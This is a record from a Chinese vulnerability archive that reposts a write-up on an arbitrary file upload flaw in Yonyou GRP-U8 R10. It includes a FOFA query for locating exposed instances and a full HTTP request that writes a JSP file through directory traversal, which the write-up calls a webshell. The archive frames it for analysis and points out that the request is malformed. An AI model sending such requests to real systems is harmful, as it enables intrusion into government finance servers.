---
source: "MrWQ/vulnerability-paper"
title: "用友GRP-U8 UploadFileData重复参数/目录穿越上传"
product: "用友GRP-U8"
record_type: "vulnerability"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
primary_identifiers: ""
referenced_identifiers: ""
identifier_status: "unknown"
affected_scope: "R10声明"
prerequisites: "Cookie示例，未确认未授权"
side_effects: "文件写入/上传示例可能留下文件、覆盖数据或触发脚本执行"
review_date: "2026-10-02"
source_url: "https://mp.weixin.qq.com/s/OEk9Muj5-QobFjslNxplVA"
source_status: "recorded"
archive_url: "https://github.com/Ares-X/VulWiki/blob/41940cb0038d09ca5aaddbe5bffb923e423d210f/Web%E5%AE%89%E5%85%A8/ERP%E4%BC%81%E4%B8%9A/%E7%94%A8%E5%8F%8BGRP-u8/%E7%94%A8%E5%8F%8B%20GRP-U8%20%E5%AD%98%E5%9C%A8%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E.md"
id: "vw-046565bf916bee92bcd91e73"
entity_id: "ve-046565bf916bee92bcd91e73"
schema_version: "1"
previous_fofa_unverified: "查询语句"
fofa: "app=\"用友 - GRP-U8\""
---

# 用友GRP-U8 UploadFileData重复参数/目录穿越上传

> 指纹字段校订（2026-10-04）：按原归档正文的明确平台标签及完整表达式恢复当前查询，旧误填或截取字段逐字保存在 `previous_*`；后文对此旧字段的诊断按当前字段阅读。仅经过本库保守语法与原字面核对，未在线运行查询，不把指纹命中视为漏洞存在。

## 条目说明

- 对象与具体问题：用友GRP-U8；UploadFileData重复参数/目录穿越上传
- 版本、配置及部署条件：R10声明
- 认证与权限前提：Cookie示例，未确认未授权
- 核验边界：已完成原始 Markdown 的文本审阅；未执行 PoC、未访问目标、未视检截图。来源所述影响与复现结果不等于本库独立验证。

## 证据边界与更正

以下记录原始资料的证据边界。可以由原文确定的产品、编号及格式问题已在本条修订；没有原始证据的版本、响应和补丁信息仍待核实。

- multipart Content-Type缺boundary，Content-Disposition丢name/filename
- 重复1参数和双filename顺序很关键但未解释；非普通上传
- POC&EXP无与正文有请求是脚本未提供应改措辞
- FOFA误取查询语句；补丁htinfo域归属需核，不仅链接存在

## 操作风险

文件写入/上传示例可能留下文件、覆盖数据或触发脚本执行。保留原示例供静态分析；仅可在明确授权的隔离测试环境验证，事先准备备份与回滚。

## 技术资料与来源记录

> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/OEk9Muj5-QobFjslNxplVA)

用友 GRP-U8 存在任意文件上传漏洞 
=====================

免责声明：请勿利用文章内的相关技术从事非法测试，由于传播、利用此文所提供的信息或者工具而造成的任何直接或者间接的后果及损失，均由使用者本人负责，所产生的一切不良后果与文章作者无关。该文章仅供学习用途使用。

1. 用友 GRP-U8 简介
---------------

微信公众号搜索：南风漏洞复现文库 该文章 南风漏洞复现文库 公众号首发

用友 GRP-U8 是面向政府及行政事业单位的财政管理应用。

2. 漏洞描述
-------

用友 GRP-U8 是面向政府及行政事业单位的财政管理应用。北京用友政务软件有限公司 GRP-U8 存在任意文件上传漏洞

CVE 编号:

CNNVD 编号:

CNVD 编号:

3. 影响版本
-------

用友 GRP-U8R10 

![](https://mmbiz.qpic.cn/sz_mmbiz_png/HsJDm7fvc3ZYcJcMC8amYzo7xLCdlEpaTTj11QjH4IvgnNa8FZPvicHkMMOmHdIowiaMiafkQBow4ia2hLhxfkcdVA/640?wx_fmt=png)

4.fofa 查询语句
-----------

app="用友 - GRP-U8"

5. 漏洞复现
-------

漏洞数据包：

```http
POST http://127.0.0.1/UploadFileData?action=upload_file&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&foldername=..%2F&filename=94156577.jsp&filename=1.jpg HTTP/1.1
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.134 Safari/537.36
Accept-Encoding: gzip, deflate
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Connection: keep-alive
Accept-Language: zh-CN,zh;q=0.9
Cookie: JSESSIONID=59227D2C93FE3E8C2626DA625CE710F9
Content-Type: multipart/form-data
Upgrade-Insecure-Requests: 1
Content-Length: 177

--ec126a48c5b7676dce1b676f5251358f
Content-Disposition: form-data; 

<% out.println("3135168535");%>
--ec126a48c5b7676dce1b676f5251358f--


```

> 请求长度说明：原资料 Content-Length 为 177；保留原始标头；其数值未据实际请求体重新计算或验证。

![](https://mmbiz.qpic.cn/sz_mmbiz_png/HsJDm7fvc3ZYcJcMC8amYzo7xLCdlEpa9VZLpV6pst5MXENicalOrn5tmI9uy48Mkd7DhapVvg1JSQic0X2PhLwA/640?wx_fmt=png)

 上传成后 webshell 地址：http://127.0.0.1/R9iPortal/94156577.jsp

![](https://mmbiz.qpic.cn/sz_mmbiz_png/HsJDm7fvc3ZYcJcMC8amYzo7xLCdlEpaUw6smsms1JYxI6uauAo2eTrl6yjNcNaz093W3Bpu8TuFlBlDcln0Iw/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/sz_mmbiz_png/HsJDm7fvc3ZYcJcMC8amYzo7xLCdlEpaCbzR1iankNltaJvnV4rfjKUUicma6mmicaqBXnecU4Munow1uQMoxaX4g/640?wx_fmt=png)

6.POC&EXP
---------

无，这套系统看起是政府单位用的多。各位慎重一点

7. 整改意见
-------

厂商已发布相关漏洞补丁链接，请及时更新：http://www.htinfo.com.cn/xzsy/gushi/mfs.html

8. 往期回顾
-------

[用友 NC Cloud 存在前台远程命令执行漏洞 附 POC 软件](http://mp.weixin.qq.com/s?__biz=MzIxMjEzMDkyMA==&mid=2247484131&idx=1&sn=0016109ec58560dc9987e749a5e670ce&chksm=974b8fe4a03c06f278e7392f126a133d205b6c93a313875de0d873c652851d7ddd5bd834f5c9&scene=21#wechat_redirect)  

[金蝶云星空管理中心存在反序列化命令执行 附 POC](http://mp.weixin.qq.com/s?__biz=MzIxMjEzMDkyMA==&mid=2247484124&idx=1&sn=4865340bc137822d6cd9b530e852cda0&chksm=974b8fdba03c06cdd40213b1d8b84172c0d5670da076e84440ccab791b90ec9974d4e23766e4&scene=21#wechat_redirect)

---

> 来源：MrWQ/vulnerability-paper（https://github.com/MrWQ/vulnerability-paper）
